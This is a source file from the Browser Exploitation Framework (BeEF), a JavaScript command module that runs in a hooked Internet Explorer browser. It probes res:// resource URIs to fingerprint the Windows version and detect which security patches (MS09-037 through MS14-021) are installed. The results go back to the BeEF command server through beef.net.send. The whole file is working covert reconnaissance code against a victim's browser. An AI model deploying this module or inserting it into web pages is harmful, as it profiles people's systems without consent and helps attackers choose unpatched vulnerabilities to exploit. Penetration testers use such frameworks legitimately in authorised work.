//
// Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var os_version = new Array;
        var installed_patches = new Array;
	var dom = document.createElement('b');

	Array.prototype.unique = function() {
		var o = {}, i, l = this.length, r = [];
		for(i=0; i<l;i+=1) o[this[i]] = this[i];
		for(i in o) r.push(o[i]);
		return r;
	};

	parse_os_details = function() {
		if (!os_version.length) os_version[0] = "unknown"
                if (!installed_patches.length) installed_patches[0] = "unknown"
                beef.net.send("<%= @command_url %>", <%= @command_id %>, "windows_nt_version="+os_version.unique());
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "installed_patches=" +installed_patches.unique());
		document.body.removeChild(dom);
	};

	// OS fingerprints // in the form of: "URI","NT version(s)"
	var fingerprints = new Array(
		new Array("5.1+","res://IpsmSnap.dll/wlcm.bmp"),
		new Array("5.1+","res://wmploc.dll/257/album_0.png"),
		new Array("5.1-6.0","res://wmploc.dll/23/images\amg-logo.gif"),
		new Array("5.1-6.1","res://wmploc.dll/wmcomlogo.jpg"),
		new Array("6.0+","res://wdc.dll/error.gif")
	);

	for (var i=0; i<fingerprints.length; i++) {
		var img    = new Image;
		img.name   = fingerprints[i][0];
		img.src    = fingerprints[i][1];
		img.onload = function() { os_version.push(this.name); dom.removeChild(this); }
                img.onerror= function() { dom.removeChild(this); }
		dom.appendChild(img);
	}

	// Enumerate patches
	var path = "res://C:\\WINDOWS\\$NtUninstall";
	var patches = new Array(
		new Array("KB2964358", "mshtml.dll/2/2030"), //MS14-021
		new Array("KB2936068", "mshtmled.dll/2/2503"), //MS14-018
		new Array("KB2864063", "themeui.dll/2/120"), //MS13-071
		new Array("KB2859537", "ntkrpamp.exe/2/1"), //MS13-063
		new Array("KB2813345", "mstscax.dll/2/101"), //MS13-029
		new Array("KB2820917", "winsrv.dll/#2/#512"), //MS13-033
		new Array("KB2691442", "shell32.dll/2/130"), //MS12-048
		new Array("KB2676562", "ntkrpamp.exe/2/1"), //MS12-034
		new Array("KB2506212", "mfc42.dll/#2/#26567"), //MS11-024
		new Array("KB2483185", "shell32.dll/2/130"), //MS11-006
		new Array("KB2481109", "mstsc.exe/#2/#620"), //MS11-017
		new Array("KB2443105", "isign32.dll/2/#101"), //MS10-097
		new Array("KB2393802", "ntkrnlpa.exe/2/#1"), //MS11-011
		new Array("KB2387149", "mfc40.dll/#2/#26567"), //MS10-074
		new Array("KB2296011", "comctl32.dll/#2/#120"), //MS10-081
		new Array("KB979687", "wordpad.exe/#2/#131"), //MS10-083
		new Array("KB978706", "mspaint.exe/#2/#102"), //MS10-005
		new Array("KB977914", "iyuv_32.dll/2/INDEOLOGO"), //MS10-013
		new Array("KB973869", "dhtmled.ocx/#2/#1") //MS09-037
	);
        for (var i=0; i<patches.length; i++) {
                var img    = new Image;
                img.name   = patches[i][0];
                img.src    = path+patches[i][0]+"$\\"+patches[i][1];
                img.onload = function() { installed_patches.push(this.name); dom.removeChild(this); }
		img.onerror= function() { dom.removeChild(this); }
                dom.appendChild(img);
        }

	setTimeout('parse_os_details();', 3000);

});

